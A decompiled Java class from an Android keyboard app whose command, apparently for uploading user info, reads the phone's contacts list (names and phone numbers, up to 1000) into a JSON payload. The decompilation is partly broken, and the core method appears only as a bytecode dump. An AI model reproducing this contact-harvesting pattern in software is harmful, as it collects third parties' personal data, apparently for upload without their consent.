package com.cootek.smartinput5.net.cmd;

import android.content.Context;
import com.cootek.smartinput5.func.C1368X;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: com.cootek.smartinput5.net.cmd.K */
/* compiled from: CmdUploadInfo */
public class C2253K extends C2259P {

    /* renamed from: a */
    private Context f9641a;

    /* renamed from: b */
    private JSONArray f9642b;

    public C2253K(Context context) {
        this.f9641a = context;
        if (this.f9641a == null) {
            this.f9641a = C1368X.m6313b();
        }
        this.f9642b = new JSONArray();
    }

    /* renamed from: b */
    public boolean mo7767b() {
        return true;
    }

    /* access modifiers changed from: protected */
    /* renamed from: c */
    public String mo7768c() {
        return C2258O.UPLOAD_INFO.mo7825a(f9738J);
    }

    /* access modifiers changed from: protected */
    /* renamed from: e */
    public String mo7770e() {
        return f9740L;
    }

    /* access modifiers changed from: protected */
    /* renamed from: a */
    public Object mo7764a(JSONObject jSONObject) throws JSONException {
        return m10274j();
    }

    /* JADX WARNING: Code restructure failed: missing block: B:55:?, code lost:
        r1.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:57:0x00f7, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:59:?, code lost:
        r1.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:61:?, code lost:
        throw r0;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:64:?, code lost:
        r7.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:66:0x0103, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:68:?, code lost:
        r7.close();
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:66:0x0103 A[ExcHandler: all (r0v7 'th' java.lang.Throwable A[CUSTOM_DECLARE]), Splitter:B:27:0x0098] */
    /* renamed from: j */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private java.lang.Object m10274j() {
        /*
            r10 = this;
            r6 = 0
            org.json.JSONArray r0 = r10.f9642b
            if (r0 == 0) goto L_0x0010
            org.json.JSONArray r0 = r10.f9642b
            int r0 = r0.length()
            if (r0 <= 0) goto L_0x0010
            org.json.JSONArray r0 = r10.f9642b
        L_0x000f:
            return r0
        L_0x0010:
            android.content.Context r0 = r10.f9641a
            if (r0 != 0) goto L_0x0016
            r0 = r6
            goto L_0x000f
        L_0x0016:
            android.content.Context r0 = r10.f9641a     // Catch:{ Exception -> 0x003b }
            android.content.ContentResolver r0 = r0.getContentResolver()     // Catch:{ Exception -> 0x003b }
            android.net.Uri r1 = android.provider.ContactsContract.Contacts.CONTENT_URI     // Catch:{ Exception -> 0x003b }
            r2 = 3
            java.lang.String[] r2 = new java.lang.String[r2]     // Catch:{ Exception -> 0x003b }
            r3 = 0
            java.lang.String r4 = "display_name"
            r2[r3] = r4     // Catch:{ Exception -> 0x003b }
            r3 = 1
            java.lang.String r4 = "has_phone_number"
            r2[r3] = r4     // Catch:{ Exception -> 0x003b }
            r3 = 2
            java.lang.String r4 = "_id"
            r2[r3] = r4     // Catch:{ Exception -> 0x003b }
            r3 = 0
            r4 = 0
            r5 = 0
            android.database.Cursor r7 = r0.query(r1, r2, r3, r4, r5)     // Catch:{ Exception -> 0x003b }
            if (r7 != 0) goto L_0x003e
            r0 = r6
            goto L_0x000f
        L_0x003b:
            r0 = move-exception
            r0 = r6
            goto L_0x000f
        L_0x003e:
            org.json.JSONArray r0 = new org.json.JSONArray
            r0.<init>()
            r10.f9642b = r0
            int r0 = r7.getCount()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r0 <= 0) goto L_0x00e6
            boolean r0 = r7.moveToFirst()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r0 == 0) goto L_0x00e6
        L_0x0051:
            r0 = 0
            java.lang.String r8 = r7.getString(r0)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            r0 = 2
            long r4 = r7.getLong(r0)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            r0 = 1
            int r0 = r7.getInt(r0)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r0 <= 0) goto L_0x00d6
            boolean r0 = android.text.TextUtils.isEmpty(r8)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r0 != 0) goto L_0x00d6
            android.content.Context r0 = r10.f9641a     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            android.content.ContentResolver r0 = r0.getContentResolver()     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            android.net.Uri r1 = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            r2 = 1
            java.lang.String[] r2 = new java.lang.String[r2]     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            r3 = 0
            java.lang.String r9 = "data1"
            r2[r3] = r9     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            r3.<init>()     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            java.lang.String r9 = "contact_id='"
            java.lang.StringBuilder r3 = r3.append(r9)     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            java.lang.StringBuilder r3 = r3.append(r4)     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            java.lang.String r4 = "'"
            java.lang.StringBuilder r3 = r3.append(r4)     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            r4 = 0
            r5 = 0
            android.database.Cursor r0 = r0.query(r1, r2, r3, r4, r5)     // Catch:{ Exception -> 0x00ed, all -> 0x0103 }
            r1 = r0
        L_0x0098:
            org.json.JSONArray r0 = new org.json.JSONArray     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            r0.<init>()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r1 == 0) goto L_0x00bc
            int r2 = r1.getCount()     // Catch:{ Exception -> 0x00f0, all -> 0x00f7 }
            if (r2 <= 0) goto L_0x00b9
            boolean r2 = r1.moveToFirst()     // Catch:{ Exception -> 0x00f0, all -> 0x00f7 }
            if (r2 == 0) goto L_0x00b9
        L_0x00ab:
            r2 = 0
            java.lang.String r2 = r1.getString(r2)     // Catch:{ Exception -> 0x00f0, all -> 0x00f7 }
            r0.put(r2)     // Catch:{ Exception -> 0x00f0, all -> 0x00f7 }
            boolean r2 = r1.moveToNext()     // Catch:{ Exception -> 0x00f0, all -> 0x00f7 }
            if (r2 != 0) goto L_0x00ab
        L_0x00b9:
            r1.close()     // Catch:{ Exception -> 0x0108, all -> 0x0103 }
        L_0x00bc:
            int r1 = r0.length()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r1 <= 0) goto L_0x00d6
            org.json.JSONObject r1 = new org.json.JSONObject     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            r1.<init>()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            java.lang.String r2 = "name"
            r1.put(r2, r8)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            java.lang.String r2 = "phone"
            r1.put(r2, r0)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            org.json.JSONArray r0 = r10.f9642b     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            r0.put(r1)     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
        L_0x00d6:
            boolean r0 = r7.moveToNext()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            if (r0 == 0) goto L_0x00e6
            org.json.JSONArray r0 = r10.f9642b     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            int r0 = r0.length()     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
            r1 = 1000(0x3e8, float:1.401E-42)
            if (r0 < r1) goto L_0x0051
        L_0x00e6:
            r7.close()     // Catch:{ Exception -> 0x010c }
        L_0x00e9:
            org.json.JSONArray r0 = r10.f9642b
            goto L_0x000f
        L_0x00ed:
            r0 = move-exception
            r1 = r6
            goto L_0x0098
        L_0x00f0:
            r2 = move-exception
            r1.close()     // Catch:{ Exception -> 0x00f5, all -> 0x0103 }
            goto L_0x00bc
        L_0x00f5:
            r1 = move-exception
            goto L_0x00bc
        L_0x00f7:
            r0 = move-exception
            r1.close()     // Catch:{ Exception -> 0x010a, all -> 0x0103 }
        L_0x00fb:
            throw r0     // Catch:{ Exception -> 0x00fc, all -> 0x0103 }
        L_0x00fc:
            r0 = move-exception
            r7.close()     // Catch:{ Exception -> 0x0101 }
            goto L_0x00e9
        L_0x0101:
            r0 = move-exception
            goto L_0x00e9
        L_0x0103:
            r0 = move-exception
            r7.close()     // Catch:{ Exception -> 0x010e }
        L_0x0107:
            throw r0
        L_0x0108:
            r1 = move-exception
            goto L_0x00bc
        L_0x010a:
            r1 = move-exception
            goto L_0x00fb
        L_0x010c:
            r0 = move-exception
            goto L_0x00e9
        L_0x010e:
            r1 = move-exception
            goto L_0x0107
        */
        throw new UnsupportedOperationException("Method not decompiled: com.cootek.smartinput5.net.cmd.C2253K.m10274j():java.lang.Object");
    }

    /* renamed from: l */
    public String mo7780l() {
        return "CmdUI";
    }
}
